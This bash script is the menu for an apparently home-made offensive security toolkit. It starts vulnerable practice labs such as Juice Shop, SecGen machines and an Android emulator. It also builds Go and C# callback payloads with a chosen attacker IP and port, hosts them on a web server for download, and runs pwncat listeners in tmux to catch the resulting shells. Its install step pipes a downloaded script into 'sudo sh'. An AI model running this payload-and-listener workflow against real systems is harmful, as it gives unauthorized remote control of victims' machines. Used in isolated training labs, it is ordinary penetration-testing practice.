#!/bin/bash
r=`tput setaf 1`
g=`tput setaf 2`
y=`tput setaf 3`
rc=`tput sgr0`
# End VARS
USERNAME=$(getent passwd | awk -F: '$3 == 1000 {print $1}')
if [ "$1" == "--build" ] ; then
	docker build -t osi_listener `pwd`/dockerfiles/listener/ # change to docker compose to avoid pull errors
	docker build -t osi_webserver `pwd`/dockerfiles/webserver/
	docker build -t osi_csharp `pwd`/dockerfiles/payloads/dotnet/
  docker build -t osiris `pwd`/dockerfiles/machines/osiris/
  docker build -t juiceshop `pwd`/dockerfiles/machines/juiceshop/
  docker build -t android-s8 `pwd`/dockerfiles/machines/android/
	exit
fi
if [ "$1" == "--install" ] ; then
	sudo usermod -aG docker $USERNAME
	curl https://get.docker.com/ | sudo sh
	exit
fi
printf "${g}Type help for options, type q! to quit.${rc}\n"
while true ; do
	cd .completion 
	read -e -p "${y}>>> ${rc}" OPTION
	cd - > /dev/null
	if [ "$OPTION" == "webserver" ]; then
		docker run  --restart=unless-stopped -it -d -v `pwd`/www:/var/www/html/ --name osi_webserver -p 80:80 osi_webserver:latest &>/dev/null
		if [ "$?" -eq "0" ] ; then
			printf "${g}[+]${rc} Webserver started\n"
		fi
	fi
  if [ "$OPTION" == "lab" ]; then
    printf "*SELECT A OPTION*
[1] - WEB-APP
[2] - RANDOM VULNERABLE MACHINE (SECGEN)
[3] - BROWSER KALI 
[4] - ANDROID EMULATOR
[5] - EXIT \n"
		docker ps
    read -p "${r}[LAB]>>> ${rc}" LAB
    if [ "$LAB" -eq "1" ]; then
      docker run -d -p 9001:3000 --name juiceshop juiceshop:latest &> /dev/null
      if [ "$?" -eq "0" ]; then
        echo -e "juiceShop setup sucesfully, running on port 9001\n"
      fi
    fi
    if [ "$LAB" -eq "2" ]; then
      cd ~/SecGen && ruby secgen.rb run &> /dev/null && cd - &> /dev/null ### add way to provison machine with VPN
        if [ "$?" -eq "0" ]; then
      	echo -e "Vulnerable machine setup, scan for it on your network\n"
        fi
    fi
    if [ "$LAB" -eq "3" ]; then
      docker run -d --cap-add=NET_ADMIN --restart=unless-stopped --name osiris -v `pwd`/volumes/osiris/share:/share osiris:latest &> /dev/null && docker logs osiris
        if [ "$?" -eq "0" ]; then
          echo -e "Osiris setup."
        fi
    fi
    if [ "$LAB" -eq "4" ]; then
       docker run --privileged -d -p 6080:6080 -p 5554:5554 -p 5555:5555 -e DEVICE="Samsung Galaxy S8" --name android-s8 android-s8:latest
       if [ "$?" -eq "0" ]; then
          read -p "Samsung Galaxy S8 setup, access the shell now? [Y]: " SHELL
        fi
        	if [ "$SHELL" == "y" ]; then
        		adb connect localhost:5555 &> /dev/null
        		adb shell
        	else
        	break 
        	fi 
    fi
    if [ "$LAB" -eq "5" ]; then
      break
    fi
  fi
	while [ "$OPTION" == "payloads" ] ; do
		cat <<-_EOF_
			*SELECT A PAYLOAD*
[1] - GO-PAYLOAD-LOCAL
[2] - GO-PAYLOAD-REMOTE
[3] - CSHARP-PAYLOAD-LOCAL
[4] - SLOT04
[5] - EXIT
		_EOF_
		read -p "${r}[PAYLOADS]>>> ${rc}" PAYLOAD
		if [[ "$PAYLOAD" -eq "5" ]] ; then
      printf "\n${g}Main menu${rc}\n"
			break
    fi
		if [[ "$PAYLOAD" =~ ^[1-5]$ ]]; then
			if [ "$PAYLOAD" == "1" ]; then
				read -p "Payload Port: " PORT
				read -p "Payload IP: " IP
				sed -i "s/PORT/$PORT/;s/IP/$IP/" `pwd`/payloads/go_payload/local/main.go
				make -C payloads/go_payload/local/ &>/dev/null
				if [ "$?" -eq "0" ] ; then
					printf "${g}[+]${rc} Payload created... Copying to www directory\n"
					cp `pwd`/payloads/go_payload/local/build/* `pwd`/www/
					sed -i "s/$PORT/PORT/;s/$IP/IP/" `pwd`/payloads/go_payload/local/main.go # reset vars in main.go
        fi	
			fi
			if [ "$PAYLOAD" == "2" ]; then
        read -p "Payload Port: " PORT
        read -p "Payload IP: " IP
        sed -i "s/PORT/$PORT/;s/IP/$IP/" `pwd`/payloads/go_payload/remote/main.go
        make -C payloads/go_payload/remote/ &>/dev/null
        if [ "$?" -eq "0" ] ; then
            printf "${g}[+]${rc} Payload created... Copying to www directory\n"
            cp `pwd`/payloads/go_payload/remote/build/* `pwd`/www/
            sed -i "s/$PORT/PORT/;s/$IP/IP/" `pwd`/payloads/go_payload/remote/main.go # reset vars in main.go
				fi	
			fi
			if [ "$PAYLOAD" == "3" ]; then
        read -p "Payload Port: " PORT
        read -p "Payload IP: " IP
        cp `pwd`/dockerfiles/payloads/dotnet/main.cs `pwd`/www && sed -i "s/PORT/$PORT/;s/IP/$IP/" `pwd`/www/main.cs
				docker run --name osi_dotnet -it -d -v `pwd`/www:www osi_csharp:latest /bin/compile.sh -b &>/dev/null
        if [ "$?" -eq "0" ] ; then
            printf "${g}[+]${rc} Payload created...\n"
            sed -i "s/$PORT/PORT/;s/$IP/IP/" `pwd`/payloads/csharp/main.cs # reset vars
        fi
      fi
		else
			printf "${r}[+]${rc} Invalid option!\n"
		fi
	done
	if [ "$OPTION" == "help" ] ; then
		printf "${y}*********************OPTIONS***************************${rc}\nlisteners payloads webserver help q!\n"
	fi
	if [ "$OPTION" == "q!" ] ; then
		echo "Quitting!"
		exit 0
	fi
	while [ "$OPTION" == "listeners" ] ; do
		cd .listener_completion
		read -e -p "${y}[LISTENERS]>>> ${rc}" LISTENERS
		cd - > /dev/null
		if [[ "$LISTENERS" == "back" ]] ; then
			break 
		fi
		if [ "$LISTENERS" == "del" ] ; then
			cd .listeners
			read -e -p "${y}[LISTENERS:DEL]>>> ${rc}" DELETE
			cd - &>/dev/null
			head `pwd`/volumes/listeners/$DELETE/vars.out &>/dev/null
			if [ "$?" -eq "1" ] ; then
        printf "Del Usage:\n${g}del listener_name\n"
			else
				docker kill $DELETE &>/dev/null
				docker rm $DELETE &>/dev/null
        rm .listeners/$DELETE
       	rm -r `pwd`/volumes/listeners/$DELETE
				if [ "$?" -eq "0" ] ; then
					printf "${g}[+]${rc} Removed the desired listener\n"
				fi
      fi
		fi
    while [[ "$LISTENERS" == "create" ]] ; do
			read -p "${g}Listener name: ${rc}" listener_name
			read -p "${g}Port: ${rc}" port # find better way to do these
			if [[ "$port" -ge 1 && "$port" -le 65535 ]]; then
				echo -e "listener_name=$listener_name\nport=$port" > /tmp/vars.out && mkdir -p `pwd`/volumes/listeners/$listener_name && cp /tmp/vars.out `pwd`/volumes/listeners/$listener_name/
				docker run -d -it -p $port:$port --name $listener_name -v `pwd`/volumes/listeners/$listener_name:/config osi_listener:latest /usr/local/bin/startpwncat.sh -b &> /dev/null
			else
				printf "Try again with a valid port\n"
				break
			fi
			if [[ "$?" -ne "0" ]] ; then
				printf "Cannot create a listener with a empty/shared name!\n"
				break
			else
				printf "${g}[+]${rc} Listener created\n"
      fi
			touch .listeners/$listener_name
			tmux new -s $listener_name -d
			tmux send-keys 'source /tmp/vars.out && clear && echo "listening on port $port" && docker attach $listener_name' C-m
			break
		done
		if [[ "$LISTENERS" == "show" ]] ; then
			printf "${y}Active Listeners${rc}\n"
			echo "CONTAINER ID   IMAGE                    COMMAND                  CREATED          STATUS          PORTS                                            NAMES"
                	docker ps -a | grep "osi_listener"
		fi
		while [[ "$LISTENERS" == "interact" ]] ; do
			cd .listeners &>/dev/null
			read -e -p "${y}[LISTENERS:INTERACT]>>> ${rc}" INTERACT
			cd - &>/dev/null
			if [[ "$INTERACT" == "back" ]] ; then
        break
      fi
			if [[ "$INTERACT" != "back" ]]; then
				tmux attach -t $INTERACT &> /dev/null
				if [[ "$?" -ne "0" ]] ; then
					printf "${r}[+]${rc} No such session named '$INTERACT' ...\n"
				fi
			fi
		cd - &> /dev/null
		done
		if [[ "$LISTENERS" == "help" ]] ; then
      echo "interact show create help back"
    fi
	done
done
